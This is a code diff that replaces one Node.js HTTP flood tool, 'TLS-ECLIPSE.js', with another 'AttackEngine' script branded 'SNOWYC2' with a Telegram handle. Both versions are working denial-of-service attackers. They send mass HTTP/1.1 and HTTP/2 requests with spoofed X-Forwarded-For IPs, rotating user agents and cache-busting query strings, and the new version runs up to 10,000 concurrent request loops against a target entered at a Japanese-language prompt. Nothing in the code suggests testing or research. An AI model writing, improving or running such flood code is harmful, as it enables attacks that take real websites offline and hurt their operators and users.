@@ -1,140 +1,167 @@
-// TLS-ECLIPSE.js
-const http = require('http');
-const http2 = require('http2');
-const url = require('url');
-const cluster = require('cluster');
+const axios = require('axios');
 const os = require('os');
-const { performance } = require('perf_hooks');
+const process = require('process');
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 
-if (process.argv.length !== 4) {
-    console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
-    process.exit(0);
-}
+const MAX_CONCURRENT = Math.min(os.cpus().length * 200, 10000); // Push max concurrency higher
+const REQUEST_TIMEOUT = 5000;  // Lower timeout for quicker response
 
-const target = process.argv[2];
-const duration = parseInt(process.argv[3]);
+// HTTP/1.1 and HTTP/2 support with keep-alive
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
 
-const parsed = url.parse(target);
-const host = parsed.host;
-const path = parsed.path || '/';
-const port = 443;
-const cores = os.cpus().length;
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
-    // Add more for variety
-];
-
-let h2RequestsSent = 0;
-let h1RequestsSent = 0;
-let totalRequests = 0;
-let startTime = performance.now();
-
-function randIP() {
-    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
-}
-
-function rand(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function sendHttp2Request(client) {
-    const headers = {
-        ':method': 'GET',
-        ':path': path,
-        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-        'x-forwarded-for': randIP(),
-        'accept': '*/*',
-    };
-    const req = client.request(headers);
-    req.on('response', () => {});  // Ignore response
-    req.end();
-    h2RequestsSent++;
-}
-
-function sendHttp1Request() {
-    const options = {
-        hostname: host,
-        port: 80,
-        path: path,
-        method: 'GET',
-        headers: {
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'X-Forwarded-For': randIP(),
-            'Connection': 'keep-alive',
-        },
-    };
-
-    const req = http.request(options, (res) => {
-        res.on('data', () => {}); // Ignore data
-    });
-
-    req.end();
-    h1RequestsSent++;
-}
-
-if (cluster.isMaster) {
-    console.log(`======================================`);
-    console.log(`         TLS-ECLIPSE ATTACKER`);
-    console.log(`======================================`);
-    console.log(`[+] Target     : ${target}`);
-    console.log(`[+] Duration   : ${duration}s`);
-    console.log(`[+] Cores Used : ${cores}`);
-    console.log(`======================================`);
-
-    for (let i = 0; i < cores; i++) {
-        cluster.fork();
+class AttackEngine {
+    constructor(target, duration) {
+        this.target = target;
+        this.duration = duration * 1000;
+        this.startTime = Date.now();
+        this.stats = {
+            total: 0,
+            success: 0,
+            errors: 0,
+            peakRps: 0,
+            h1Requests: 0,
+            h2Requests: 0
+        };
+        this.running = true;
     }
 
-    const attackDuration = duration * 1000; // Attack duration in milliseconds
+    // Random user-agent generator without the extra array for speed
+    getRandomUA() {
+        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
+    }
 
-    setInterval(() => {
-        const timeElapsed = Math.floor((performance.now() - startTime) / 1000);
-        const timeLeft = duration - timeElapsed;
+    // Making requests with both HTTP/1.1 and HTTP/2
+    async makeRequest() {
+        const headers = {
+            'User-Agent': this.getRandomUA(),
+            'Connection': 'keep-alive'
+        };
 
-        console.clear();
-        console.log(`======================================`);
-        console.log(`[+] Attack Running...`);
-        console.log(`======================================`);
-        console.log(`[+] H2 Requests Sent: ${h2RequestsSent}`);
-        console.log(`[+] H1 Requests Sent: ${h1RequestsSent}`);
-        console.log(`[+] Time Left: ${timeLeft}s`);
-        console.log(`======================================`);
-    }, 1000);
+        const urlWithNoise = `${this.target}${this.target.includes('?') ? '&' : '?'}cb=${Math.random().toString(36).substring(2, 15)}`;
 
-    setTimeout(() => {
-        console.log(`\n[+] Attack Ended`);
-        process.exit(1);
-    }, attackDuration);
-} else {
-    const maxStreams = 3;  // Max number of HTTP/2 streams at a time
-    let activeStreams = 0;
+        try {
+            const isHttps = this.target.startsWith('https');
+            const isHttp2 = isHttps && this.target.includes('http2'); // Check if target is HTTP/2 supported
 
-    function attack() {
-        if (activeStreams < maxStreams) {
-            // Choose HTTP/2 or HTTP/1.1 randomly
-            if (Math.random() < 0.5) {
-                const client = http2.connect(`https://${host}`);
-                client.on('error', (err) => console.error(err));
+            const agent = isHttps ? keepAliveHttps : keepAliveHttp;
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: agent,
+                httpsAgent: agent,
+                validateStatus: null
+            });
 
-                sendHttp2Request(client);
-                activeStreams++;
-                setTimeout(() => {
-                    client.close();  // Close after request
-                    activeStreams--;
-                }, 100); // Allow time for server to handle requests
+            if (response.status === 200) {
+                this.stats.success++;
+                if (isHttp2) {
+                    this.stats.h2Requests++;
+                } else {
+                    this.stats.h1Requests++;
+                }
             } else {
-                sendHttp1Request();
+                this.stats.errors++;
             }
+        } catch {
+            this.stats.errors++;
         }
-        totalRequests++;
+        this.stats.total++;
     }
 
-    // Real RPS - Adjust this to your desired rate per second
-    const rps = 100;  // 100 requests per second
-    setInterval(attack, 1000 / rps); // Delay between requests to achieve the desired RPS
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
+    }
 
-    process.on('exit', () => {
-        console.log(`[+] Worker PID: ${process.pid} sent ~${totalRequests} total requests`);
-    });
+    async workerLoop() {
+        while (this.running && Date.now() - this.startTime < this.duration) {
+            await this.makeRequest();
+        }
+    }
+
+    async runAttack() {
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
+
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
+            const elapsed = (Date.now() - this.startTime) / 1000;
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+
+            // Japanese Attack Report
+            const timeRemaining = Math.max(0, (this.duration - (Date.now() - this.startTime)) / 1000).toFixed(1);
+            process.stdout.write(
+                `\r  H2リクエスト: ${this.stats.h2Requests} | H1リクエスト: ${this.stats.h1Requests} | 残り時間: ${timeRemaining}s | ` +
+                `送信済み: ${this.stats.total} | 200 OK: ${this.stats.success} | エラー: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
+            );
+        }, 200);
+
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
+        this.printSummary();
+    }
+
+    printSummary() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const avgRps = this.stats.total / elapsed;
+        console.log('\n\n  攻撃完了');
+        console.log('  ============================================');
+        console.log(`  時間:        ${elapsed.toFixed(1)}秒`);
+        console.log(`  合計:        ${this.stats.total}`);
+        console.log(`  成功:        ${this.stats.success}`);
+        console.log(`  エラー:      ${this.stats.errors}`);
+        console.log(`  平均RPS:     ${avgRps.toFixed(1)}`);
+        console.log(`  最大RPS:     ${this.stats.peakRps.toFixed(1)}`);
+        console.log('  ============================================\n');
+    }
 }
+
+// Main
+(async () => {
+    const readline = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+
+    const ask = (q) => new Promise(resolve => readline.question(q, resolve));
+
+    const targetInput = await ask("ターゲット: ");
+    let target = targetInput.trim();
+    if (!target.startsWith("http")) {
+        target = "http://" + target;
+    }
+
+    const durationInput = await ask("時間: ");
+    readline.close();
+
+    const duration = parseInt(durationInput);
+    if (isNaN(duration)) {
+        console.log("無効な時間入力です。");
+        return;
+    }
+
+    const engine = new AttackEngine(target, duration);
+    try {
+        await engine.runAttack();
+    } catch (err) {
+        console.error("攻撃失敗:", err.message);
+    }
+})();
